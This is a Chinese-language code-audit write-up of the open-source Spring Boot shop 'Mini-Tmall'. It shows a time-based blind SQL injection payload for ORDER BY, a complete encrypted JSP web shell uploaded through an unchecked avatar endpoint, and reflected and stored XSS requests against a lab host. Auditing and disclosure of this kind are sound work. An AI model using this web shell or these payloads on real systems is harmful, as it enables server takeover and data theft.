---
title: Mini-Tmall
description: GitHub地址-https://github.com/robin-liyong/-Mini-Tmall-
date: 2024-12-25
image: cover.png
categories:
    - cate2
tags:
    - Code Audit
---

## 介绍

​	迷你天猫商城是一个基于Spring Boot的综合性B2C电商平台，需求设计主要参考天猫商城的购物流程：用户从注册开始，到完成登录，浏览商品，加入购物车，进行下单，确认收货，评价等一系列操作。 作为迷你天猫商城的核心组成部分之一，天猫数据管理后台包含商品管理，订单管理，类别管理，用户管理和交易额统计等模块，实现了对整个商城的一站式管理和维护。

## 项目依赖审计

​	此maven项目的pom文件没有找到披露的漏洞，经过验证，工具所扫描出来的结果也是误报。

## 单点漏洞审计

### SQL

​	该项目所用的数据库交互以来为Mybatis，所以全局搜索$。

![image-20241224193427314](/image-20241224193427314.png)

​	可见在mapper文件中存在多个疑似注入点，逐个审计。

#### src/main/resources/mybatis/mapper/UserMapper.xml（成功）

```xml
    <select id="select" resultMap="userMap">
        SELECT user_id,user_name,user_nickname,user_password,user_realname,user_gender,user_birthday,user_profile_picture_src,user_address,user_homeplace FROM user
        <if test="user != null">
            <where>
                <if test="user.user_name != null">
                    (user_name LIKE concat('%',#{user.user_name},'%') or user_nickname LIKE concat('%',#{user.user_name},'%'))
                </if>
                <if test="user.user_gender != null">
                    and user_gender = #{user.user_gender}
                </if>
            </where>
        </if>
        <if test="orderUtil != null">
            ORDER BY ${orderUtil.orderBy}<if test="orderUtil.isDesc">desc </if>
        </if>
        <if test="pageUtil != null">
            LIMIT #{pageUtil.pageStart},#{pageUtil.count}
        </if>
    </select>
```

​	注入参数为orderUtil下的orderBy参数，向上追溯。

```java
    //按条件查询用户-ajax
    @ResponseBody
    @RequestMapping(value = "admin/user/{index}/{count}", method = RequestMethod.GET, produces = "application/json;charset=UTF-8")
    public String getUserBySearch(@RequestParam(required = false) String user_name/* 用户名称 */,
                                  @RequestParam(required = false) Byte[] user_gender_array/* 用户性别数组 */,
                                  @RequestParam(required = false) String orderBy/* 排序字段 */,
                                  @RequestParam(required = false,defaultValue = "true") Boolean isDesc/* 是否倒序 */,
                                  @PathVariable Integer index/* 页数 */,
                                  @PathVariable Integer count/* 行数 */) throws UnsupportedEncodingException {
        //移除不必要条件
        Byte gender = null;
        if (user_gender_array != null && user_gender_array.length == 1) {
            gender = user_gender_array[0];
        }

        if (user_name != null) {
            //如果为非空字符串则解决中文乱码：URLDecoder.decode(String,"UTF-8");
            user_name = "".equals(user_name) ? null : URLDecoder.decode(user_name, "UTF-8");
        }
        if (orderBy != null && "".equals(orderBy)) {
            orderBy = null;
        }
        //封装查询条件
        User user = new User()
                .setUser_name(user_name)
                .setUser_gender(gender);

        OrderUtil orderUtil = null;
        if (orderBy != null) {
            logger.info("根据{}排序，是否倒序:{}",orderBy,isDesc);
            orderUtil = new OrderUtil(orderBy, isDesc);
        }

        JSONObject object = new JSONObject();
        logger.info("按条件获取第{}页的{}条用户", index + 1, count);
        PageUtil pageUtil = new PageUtil(index, count);
        List<User> userList = userService.getList(user, orderUtil, pageUtil);
        object.put("userList", JSONArray.parseArray(JSON.toJSONString(userList)));
        logger.info("按条件获取用户总数量");
        Integer userCount = userService.getTotal(user);
        object.put("userCount", userCount);
        logger.info("获取分页信息");
        pageUtil.setTotal(userCount);
        object.put("totalPage", pageUtil.getTotalPage());
        object.put("pageUtil", pageUtil);

        return object.toJSONString();
    }
```

​	追溯到该控制器，使用了order功能，可见这里是没有过滤的，我们定位到前端的用户管理模块

![image-20241224194043898](/image-20241224194043898.png)

​	抓包。

```http
GET /tmall/admin/user/0/10?user_name=123&user_gender_array=0&user_gender_array=1&orderBy=1&isDesc=true HTTP/1.1
Host: 172.21.53.85:8080
X-Requested-With: XMLHttpRequest
Referer: http://172.21.53.85:8080/tmall/admin
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: JSESSIONID=3B16C09E8A179A970E83C60845A3ED95; username=1209577113; admin-token=1#2F31733671566670654C7A6C432B6766575978556E4E58456F4554656B56596479727567522B483048444B544C5A4F5332736C4673556352716E516573486D535366716C76524751733336462F746D77657036476C516F4C493741783532773834364D74783071516B5079657A6856355766355970547677473254736F2F5165454A656B366857734474653154734B672F494A4A33773D3D
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: */*
```

​	其中的注入点为orderBy参数，尝试注入。输入单引号后报错，尝试闭合，构造payload。

```sql
if(ascii(substr((select%20database()),1,1))=1,sleep(0.1),1)
```

![image-20241224205026604](/image-20241224205026604.png)

​	导出数据后处理，得到库名：

![image-20241224205053441](/image-20241224205053441.png)

#### src/main/resources/mybatis/mapper/RewardMapper.xml（成功）

```xml
    <select id="select" resultMap="rewardMap">
        SELECT
            reward_id,
            reward_name,
            reward_content,
            reward_createDate,
            reward_user_id,
            reward_state,
            reward_amount
        FROM reward
        <where>
            <if test="reward != null">
                <if test="reward.reward_name != null">reward_name LIKE concat('%',#{reward.reward_name},'%')</if>
                <if test="reward.reward_lowest_amount != null">and reward_amount &gt;= #{reward.reward_lowest_amount}</if>
                <if test="reward.reward_amount != null">and reward_amount &lt;= #{reward.reward_amount}</if>
            </if>
            <if test="reward_isEnabled_array != null">
                and reward_state IN
                <foreach collection="reward_isEnabled_array" index="index" item="item" open="(" separator=","
                         close=")">
                    #{item}
                </foreach>
            </if>
        </where>
        <if test="orderUtil != null">
            ORDER BY ${orderUtil.orderBy}
            <if test="orderUtil.isDesc">desc</if>
        </if>
        <if test="pageUtil != null">
            LIMIT #{pageUtil.pageStart},#{pageUtil.count}
        </if>
    </select>
```

​	可见这里也是一样的注入点，向上追溯。

```java
    @ResponseBody
    @RequestMapping(value = "admin/reward/{index}/{count}", method = RequestMethod.GET, produces = "application/json;charset=utf-8")
    public String getRewardBySearch(@RequestParam(required = false) String reward_name/* 打赏人名称 */,
                                     @RequestParam(required = false) Double reward_lowest_amount/* 打赏最低金额 */,
                                     @RequestParam(required = false) Double reward_highest_amount/* 打赏最高金额 */,
                                     @RequestParam(required = false) Byte[] reward_isEnabled_array/* 打赏状态数组 */,
                                     @RequestParam(required = false) String orderBy/* 排序字段 */,
                                     @RequestParam(required = false,defaultValue = "true") Boolean isDesc/* 是否倒序 */,
                                     @PathVariable Integer index/* 页数 */,
                                     @PathVariable Integer count/* 行数 */) throws UnsupportedEncodingException {
        //移除不必要条件
        if (reward_isEnabled_array != null && (reward_isEnabled_array.length <= 0 || reward_isEnabled_array.length >=3)) {
            reward_isEnabled_array = null;
        }
        if (reward_name != null) {
            //如果为非空字符串则解决中文乱码：URLDecoder.decode(String,"UTF-8");
            reward_name = "".equals(reward_name) ? null : URLDecoder.decode(reward_name, "UTF-8");
        }
        if (orderBy != null && "".equals(orderBy)) {
            orderBy = null;
        }
        //封装查询条件
        Reward reward = new Reward()
                .setReward_name(reward_name)
                .setReward_lowest_amount(reward_lowest_amount)
                .setReward_amount(reward_highest_amount);
        OrderUtil orderUtil = null;
        if (orderBy != null) {
            logger.info("根据{}排序，是否倒序:{}",orderBy,isDesc);
            orderUtil = new OrderUtil(orderBy, isDesc);
        }

        JSONObject object = new JSONObject();
        logger.info("按条件获取第{}页的{}条打赏", index + 1, count);
        PageUtil pageUtil = new PageUtil(index, count);
        List<Reward> rewardList = rewardService.getList(reward, reward_isEnabled_array, orderUtil, pageUtil);
        object.put("rewardList", JSONArray.parseArray(JSON.toJSONString(rewardList)));
        logger.info("按条件获取打赏总条数");
        Integer rewardCount = rewardService.getTotal(reward, reward_isEnabled_array);
        object.put("rewardCount", rewardCount);
        logger.info("获取分页信息");
        pageUtil.setTotal(rewardCount);
        object.put("totalPage", pageUtil.getTotalPage());
        object.put("pageUtil", pageUtil);

        return object.toJSONString();
    }
```

​	可见，代码逻辑也是相同的，所以这里直接构造payload:

```sql
if(ascii(substr((select%20database()),1,1))=1,sleep(0.1),1)
```

​	爆破得出数据。

![image-20241224210641485](/image-20241224210641485.png)

​	导出数据后处理得到库名

![image-20241224210709442](/image-20241224210709442.png)

剩余的xml文件也是相同的漏洞，这里仅贴出，不做证明：

src/main/resources/mybatis/mapper/ProductMapper.xml

src/main/resources/mybatis/mapper/ProductOrderMapper.xml

### 任意文件操控

#### src/main/java/com/xq/tmall/controller/fore/ForeUserController.java（成功）

​	通过upload寻找文件上传的控制器，这里共有四个控制器实现了文件上传的功能，这里选择一个难度更低的方式，实际上四个文件上传的控制都存在相同的漏洞。

```java
    @ResponseBody
    @RequestMapping(value = "user/uploadUserHeadImage", method = RequestMethod.POST, produces = "application/json;charset=utf-8")
    public  String uploadUserHeadImage(@RequestParam MultipartFile file, HttpSession session
    ){
        String originalFileName = file.getOriginalFilename();
        logger.info("获取图片原始文件名：{}", originalFileName);
        String extension = originalFileName.substring(originalFileName.lastIndexOf('.'));
        String fileName = UUID.randomUUID() + extension;
        String filePath = session.getServletContext().getRealPath("/") + "res/images/item/userProfilePicture/" + fileName;
        logger.info("文件上传路径：{}", filePath);
        JSONObject jsonObject = new JSONObject();
        try {
            logger.info("文件上传中...");
            file.transferTo(new File(filePath));
            logger.info("文件上传成功！");
            jsonObject.put("success", true);
            jsonObject.put("fileName", fileName);
        } catch (IOException e) {
            logger.warn("文件上传失败！");
            e.printStackTrace();
            jsonObject.put("success", false);
        }
        return jsonObject.toJSONString();
    }
```

​	 这是一个用户头像的文件上传实现，这里审计代码我们可以发现，它将传入的文件名进行了修改，也就是说这里无法进行目录穿透，但是这里并没有对后缀的校验。所以这里是存在一个任意文件上传的，而且该项目也解析jsp，所以也可以传shell。我们定位到前端的头像更换功能点，随便传一个图片后，构造数据包。

```http
POST /tmall/user/uploadUserHeadImage HTTP/1.1
Host: 172.21.53.85:8080
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: application/json, text/javascript, */*; q=0.01
Referer: http://172.21.53.85:8080/tmall/userDetails
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTAJAUStFnEcoK7fY
Origin: http://172.21.53.85:8080
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=3B16C09E8A179A970E83C60845A3ED95; username=1209577113; admin-token=1#2F31733671566670654C7A6C432B6766575978556E4E58456F4554656B56596479727567522B483048444B544C5A4F5332736C4673556352716E516573486D535366716C76524751733336462F746D77657036476C516F4C493741783532773834364D74783071516B5079657A6856355766355970547677473254736F2F5165454A656B366857734474653154734B672F494A4A33773D3D
Content-Length: 2276

------WebKitFormBoundaryTAJAUStFnEcoK7fY
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: image/jpeg

<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
    private byte[] Decrypt(byte[] data) throws Exception
    {
        String k="e45e329feb5d925b";
        javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");c.init(2,new javax.crypto.spec.SecretKeySpec(k.getBytes(),"AES"));
        byte[] decodebs;
        Class baseCls ;
                try{
                    baseCls=Class.forName("java.util.Base64");
                    Object Decoder=baseCls.getMethod("getDecoder", null).invoke(baseCls, null);
                    decodebs=(byte[]) Decoder.getClass().getMethod("decode", new Class[]{byte[].class}).invoke(Decoder, new Object[]{data});
                }
                catch (Throwable e)
                {
                    baseCls = Class.forName("sun.misc.BASE64Decoder");
                    Object Decoder=baseCls.newInstance();
                    decodebs=(byte[]) Decoder.getClass().getMethod("decodeBuffer",new Class[]{String.class}).invoke(Decoder, new Object[]{new String(data)});

                }
        return c.doFinal(decodebs);

    }
%>
<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return
        super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buf = new byte[512];
            int length=request.getInputStream().read(buf);
            while (length>0)
            {
                byte[] data= Arrays.copyOfRange(buf,0,length);
                bos.write(data);
                length=request.getInputStream().read(buf);
            }
            /* 取消如下代码的注释，可避免response.getOutputstream报错信息，增加某些深度定制的Java web系统的兼容性
            out.clear();
            out=pageContext.pushBody();
            */
            out.clear();
            out=pageContext.pushBody();
        new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);}
%>
------WebKitFormBoundaryTAJAUStFnEcoK7fY--
```

​	发包后，得到图片的URL，访问这个jsp文件。

![image-20241224213640952](/image-20241224213640952.png)

​	访问[172.21.53.85:8080/tmall/res/images/item/userProfilePicture/248f1f1d-aad8-43f6-8147-e9fd780f7ed4.jsp](http://172.21.53.85:8080/tmall/res/images/item/userProfilePicture/248f1f1d-aad8-43f6-8147-e9fd780f7ed4.jsp)，发现没有出现图片解析错误，或者将文件直接下载下来，也就是解析了jsp，使用冰蝎连接后，连接成功，执行calc命令，成功弹出计算机。

![image-20241224213823619](/image-20241224213823619.png)

### XSS

```java
    @RequestMapping(value = "product", method = RequestMethod.GET)
    public String goToPage(HttpSession session, Map<String, Object> map,
                           @RequestParam(value = "category_id", required = false) Integer category_id/* 分类ID */,
                           @RequestParam(value = "product_name", required = false) String product_name/* 产品名称 */) {
        logger.info("检查用户是否登录");
        Object userId = checkUser(session);
        if (userId != null) {
            logger.info("获取用户信息");
            User user = userService.get(Integer.parseInt(userId.toString()));
            map.put("user", user);
        }
        if (category_id == null && product_name == null) {
            return "redirect:/";
        }
        if (product_name != null && "".equals(product_name.trim())) {
            return "redirect:/";
        }

        logger.info("整合搜索信息");
        Product product = new Product();
        String searchValue = null;
        Integer searchType = null;

        if (category_id != null) {
            product.setProduct_category(new Category().setCategory_id(category_id));
            searchType = category_id;
        }
        //关键词数组
        String[] product_name_split = null;
        //产品列表
        List<Product> productList;
        //产品总数量
        Integer productCount;
        //分页工具
        PageUtil pageUtil = new PageUtil(0, 20);
        if (product_name != null) {
            product_name_split = product_name.split(" ");
            logger.info("提取的关键词有{}", Arrays.toString(product_name_split));
            product.setProduct_name(product_name);
            searchValue = product_name;
        }
        if (product_name_split != null && product_name_split.length > 1) {
            logger.info("获取组合商品列表");
            productList = productService.getMoreList(product, new Byte[]{0, 2}, null, pageUtil, product_name_split);
            logger.info("按组合条件获取产品总数量");
            productCount = productService.getMoreListTotal(product, new Byte[]{0, 2}, product_name_split);
        } else {
            logger.info("获取商品列表");
            productList = productService.getList(product, new Byte[]{0, 2}, null, pageUtil);
            logger.info("按条件获取产品总数量");
            productCount = productService.getTotal(product, new Byte[]{0, 2});
        }
        logger.info("获取商品列表的对应信息");
        for (Product p : productList) {
            p.setSingleProductImageList(productImageService.getList(p.getProduct_id(), (byte) 0, null));
            p.setProduct_category(categoryService.get(p.getProduct_category().getCategory_id()));
        }
        logger.info("获取分类列表");
        List<Category> categoryList = categoryService.getList(null, new PageUtil(0, 5));
        logger.info("获取分页信息");
        pageUtil.setTotal(productCount);

        map.put("categoryList", categoryList);
        map.put("totalPage", pageUtil.getTotalPage());
        map.put("pageUtil", pageUtil);
        map.put("productList", productList);
        map.put("searchValue", searchValue);
        map.put("searchType", searchType);

        logger.info("转到前台天猫-产品搜索列表页");
        return "fore/productListPage";
    }
```

​	该代码所实现功能为，前台的产品搜索功能，这里传入的搜索参数为product_name，审计我们可知，这里并未对product_name进行额外处理，也就是没有防御XSS。我们定位到前端，构造payload:

```html
"><img src=x onerror=alert(1)>
```

​	输入搜索框后搜索。

![image-20241225111637196](/image-20241225111637196.png)

​	成功触发反射型XSS。

```java
    @ResponseBody
    @RequestMapping(value = "admin/product/{index}/{count}", method = RequestMethod.GET, produces = "application/json;charset=utf-8")
    public String getProductBySearch(@RequestParam(required = false) String product_name/* 产品名称 */,
                                     @RequestParam(required = false) Integer category_id/* 产品类型ID */,
                                     @RequestParam(required = false) Double product_sale_price/* 产品促销价 */,
                                     @RequestParam(required = false) Double product_price/* 产品原价 */,
                                     @RequestParam(required = false) Byte[] product_isEnabled_array/* 产品状态数组 */,
                                     @RequestParam(required = false) String orderBy/* 排序字段 */,
                                     @RequestParam(required = false,defaultValue = "true") Boolean isDesc/* 是否倒序 */,
                                     @PathVariable Integer index/* 页数 */,
                                     @PathVariable Integer count/* 行数 */) throws UnsupportedEncodingException {
        //移除不必要条件
        if (product_isEnabled_array != null && (product_isEnabled_array.length <= 0 || product_isEnabled_array.length >=3)) {
            product_isEnabled_array = null;
        }
        if (category_id != null && category_id == 0) {
            category_id = null;
        }
        if (product_name != null) {
            //如果为非空字符串则解决中文乱码：URLDecoder.decode(String,"UTF-8");
            product_name = "".equals(product_name) ? null : URLDecoder.decode(product_name, "UTF-8");
        }
        if (orderBy != null && "".equals(orderBy)) {
            orderBy = null;
        }
        //封装查询条件
        Product product = new Product()
                .setProduct_name(product_name)
                .setProduct_category(new Category().setCategory_id(category_id))
                .setProduct_price(product_price)
                .setProduct_sale_price(product_sale_price);
        OrderUtil orderUtil = null;
        if (orderBy != null) {
            logger.info("根据{}排序，是否倒序:{}",orderBy,isDesc);
            orderUtil = new OrderUtil(orderBy, isDesc);
        }

        JSONObject object = new JSONObject();
        logger.info("按条件获取第{}页的{}条产品", index + 1, count);
        PageUtil pageUtil = new PageUtil(index, count);
        List<Product> productList = productService.getList(product, product_isEnabled_array, orderUtil, pageUtil);
        object.put("productList", JSONArray.parseArray(JSON.toJSONString(productList)));
        logger.info("按条件获取产品总数量");
        Integer productCount = productService.getTotal(product, product_isEnabled_array);
        object.put("productCount", productCount);
        logger.info("获取分页信息");
        pageUtil.setTotal(productCount);
        object.put("totalPage", pageUtil.getTotalPage());
        object.put("pageUtil", pageUtil);

        return object.toJSONString();
    }
```

​	这是产品管理模块的代码实现，审计代码我们可知，他并没有对查询出的结果进行额外处理，也就是没有针对XSS进行防御，所以这里是存在一个存储型XSS的，前往前端访问后抓包，构造数据包，进行XSS攻击

```http
POST /tmall/admin/product HTTP/1.1
Host: 172.24.107.171:8080
Accept: */*
Referer: http://172.24.107.171:8080/tmall/admin
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://172.24.107.171:8080
Cookie: JSESSIONID=39C90DCB9085FB0A37D3D24E3ECB7390; username=1209577113
X-Requested-With: XMLHttpRequest
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Content-Length: 859

product_category_id=1&product_isEnabled=0&product_name=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E&product_title=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E&product_price=1&product_sale_price=2&propertyJson=%7B%221%22%3A%22%3Cimg+src%3Dx+onerror%3Dalert(1)%3E%22%2C%222%22%3A%22%3Cimg+src%3Dx+onerror%3Dalert(1)%3E%22%2C%223%22%3A%22%3Cimg+src%3Dx+onerror%3Dalert(1)%3E%22%2C%224%22%3A%22%3Cimg+src%3Dx+onerror%3Dalert(1)%3E%22%2C%225%22%3A%22%3Cimg+src%3Dx+onerror%3Dalert(1)%3E%22%2C%226%22%3A%22%3Cimg+src%3Dx+onerror%3Dalert(1)%3E%22%2C%227%22%3A%22%3Cimg+src%3Dx+onerror%3Dalert(1)%3E%22%2C%228%22%3A%22%3Cimg+src%3Dx+onerror%3Dalert(1)%3E%22%2C%229%22%3A%22%3Cimg+src%3Dx+onerror%3Dalert(1)%3E%22%2C%2210%22%3A%22%3Cimg+src%3Dx+onerror%3Dalert(1)%3E%22%2C%2211%22%3A%22%3Cimg+src%3Dx+onerror%3Dalert(1)%3E%22%2C%2212%22%3A%22%3Cimg+src%3Dx+onerror%3Dalert(1)%3E%22%7D
```

​	发送数据包后访问。

![image-20241225105643023](/image-20241225105643023.png)

​	成功触发XSS攻击。在其余的功能，也是存在存储型XSS，这里不做赘述。

### 越权

```java
    @ResponseBody
    @RequestMapping(value = "orderItem/{orderItem_id}", method = RequestMethod.DELETE, produces = "application/json;charset=utf-8")
    public String deleteOrderItem(@PathVariable("orderItem_id") Integer orderItem_id,
                                  HttpSession session,
                                  HttpServletRequest request) {
        JSONObject object = new JSONObject();
        logger.info("检查用户是否登录");
        Object userId = checkUser(session);
        if (userId == null) {
            object.put("url", "/login");
            object.put("success", false);
            return object.toJSONString();
        }
        logger.info("检查用户的购物车项");
        List<ProductOrderItem> orderItemList = productOrderItemService.getListByUserId(Integer.valueOf(userId.toString()), null);
        boolean isMine = false;
        for (ProductOrderItem orderItem : orderItemList) {
            logger.info("找到匹配的购物车项");
            if (orderItem.getProductOrderItem_id().equals(orderItem_id)) {
                isMine = true;
                break;
            }
        }
        if (isMine) {
            logger.info("删除订单项信息");
            boolean yn = productOrderItemService.deleteList(new Integer[]{orderItem_id});
            if (yn) {
                object.put("success", true);
            } else {
                object.put("success", false);
            }
        } else {
            object.put("success", false);
        }
        return object.toJSONString();
    }
```

​	该项目的订单处理方法逻辑大体相同，这里仅拿出其中一个，审计项目我们可知，该项目的整体逻辑为通过cookie检查用户是否登录，再检查用户购物车是否有该项进行鉴权，如有则删除，如无则返回失败，所以这里是不存在越权漏洞的。

​	至此，该项目审计完毕。

